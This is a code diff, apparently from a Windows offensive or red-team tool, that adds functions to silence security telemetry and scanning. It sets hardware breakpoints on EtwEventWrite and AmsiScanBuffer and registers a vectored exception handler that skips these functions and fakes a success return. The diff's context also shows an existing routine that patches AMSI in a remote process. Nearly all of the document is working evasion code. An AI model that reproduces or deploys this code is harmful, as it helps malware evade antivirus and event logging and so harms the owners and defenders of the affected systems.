@@ -57,3 +57,93 @@ bool patchRemoteAmsi(HANDLE hProcess) {
     std::cout << "[+] Amsi silenced in remote process." << std::endl;
     return 0;
 }
+
+PVOID g_EtwAddr;
+void SetupEtwBypass() {
+    unsigned char* k = helperHandler.getNtdll();
+
+    wchar_t wK[50];
+    size_t convertedChars = 0;
+
+    mbstowcs_s(&convertedChars, wK, 50, (char*)k, _TRUNCATE);
+    g_EtwAddr = syscallHandler.getFunctionAddressByHash(wK, 615043106);
+    // 1. Register the VEH
+    AddVectoredExceptionHandler(1, EtwHwbpHandler);
+
+    
+    // 3. Get current thread context
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    GetThreadContext(GetCurrentThread(), &ctx);
+
+    // 4. Set the breakpoint in Dr0
+    ctx.Dr0 = (DWORD64)g_EtwAddr;
+    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
+    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)
+
+    // 5. Apply the context
+    SetThreadContext(GetCurrentThread(), &ctx);
+}
+
+LONG WINAPI EtwHwbpHandler(PEXCEPTION_POINTERS exceptions) {
+    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        // Check if the RIP is at our target function (EtwEventWrite)
+        if (exceptions->ExceptionRecord->ExceptionAddress == g_EtwAddr) {
+
+            // 1. Get the return address from the stack (RSP points to it)
+            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);
+
+            // 2. "Fake" a successful return
+            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
+            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
+            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)
+
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+
+
+PVOID g_AmsiAddr;
+void SetupAMSIBypass() {
+    LoadLibraryW(L"amsi.dll");
+    g_AmsiAddr = syscallHandler.getFunctionAddressByHash(L"amsi.dll", 704434574);
+	std::cout << "AmsiScanBuffer address: " << g_AmsiAddr << "\n";
+    // 1. Register the VEH
+    AddVectoredExceptionHandler(1, AmsiHwbpHandler);
+
+
+    // 3. Get current thread context
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    GetThreadContext(GetCurrentThread(), &ctx);
+
+    // 4. Set the breakpoint in Dr0
+    ctx.Dr0 = (DWORD64)g_AmsiAddr;
+    ctx.Dr7 |= (1 << 0); // Enable local breakpoint for Dr0
+    ctx.Dr7 &= ~(3 << 16); // Set as "Execute" breakpoint (bits 16-17 = 00)
+
+    // 5. Apply the context
+    SetThreadContext(GetCurrentThread(), &ctx);
+
+}
+LONG WINAPI AmsiHwbpHandler(PEXCEPTION_POINTERS exceptions) {
+    if (exceptions->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
+        // Check if the RIP is at our target function (EtwEventWrite)
+        if (exceptions->ExceptionRecord->ExceptionAddress == g_AmsiAddr) {
+
+            // 1. Get the return address from the stack (RSP points to it)
+            DWORD64 returnAddr = *(DWORD64*)(exceptions->ContextRecord->Rsp);
+
+            // 2. "Fake" a successful return
+            exceptions->ContextRecord->Rip = returnAddr; // Skip to the caller
+            exceptions->ContextRecord->Rsp += 8;         // Clean the stack
+            exceptions->ContextRecord->Rax = 0;          // Success (STATUS_SUCCESS)
+
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+};
